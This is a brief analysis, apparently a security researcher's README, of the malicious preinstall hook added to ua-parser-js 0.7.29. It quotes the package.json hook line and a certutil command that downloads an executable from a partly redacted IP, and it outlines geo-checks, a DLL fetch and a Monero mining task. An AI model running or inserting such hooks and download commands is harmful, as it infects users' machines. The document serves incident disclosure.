# ua-parser-vuln

Package.json has the line:
 ""preinstall": "start /B node preinstall.js & node preinstall.js"," added, to call the new attack scripts.
preinstall.js looks to see Windows, mac, linux, and call the correct file

On the linux side: It checks the server IP, if in the RU/UA/BY/KZ geo, does nothing.

Else, it pulls down  jsextention from a remote IP in the Latvia GEO

**If Windows:**
1. Pulls down jsextension.exe  (Server serving is not responding)
2. Tries to curl it down
3. If that doesn work, tries wget
4. If that doesnt work, tries certutil
    it runs “certutil.exe -urlcache -f http://159.XXX.XXX.XXX/download/jsextension.exe jsextension.exe
    
5. Then attempts to pull down create.dll from citation<redaction>.at
    Currently at a russian IP address block
6. Then adds the execute to tasklist , to connect to pool.minexmr.****

Read the diff here: https://my.diffend.io/npm/ua-parser-js/0.7.28/0.7.29#d2h-701945
